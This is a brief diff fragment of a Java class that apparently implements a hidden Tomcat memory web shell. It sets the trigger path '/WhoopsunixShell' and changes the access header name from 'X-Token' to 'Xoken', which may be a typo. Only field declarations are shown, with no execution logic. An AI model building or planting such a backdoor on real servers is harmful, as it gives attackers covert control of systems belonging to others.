@@ -16,7 +16,7 @@ import java.lang.reflect.Method;
 public class TomcatServletThreadMS implements Servlet {
     private static String NAME = "TomcatServletThreadMS";
     private static String pattern = "/WhoopsunixShell";
-    private static String header = "X-Token";
+    private static String header = "Xoken";
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
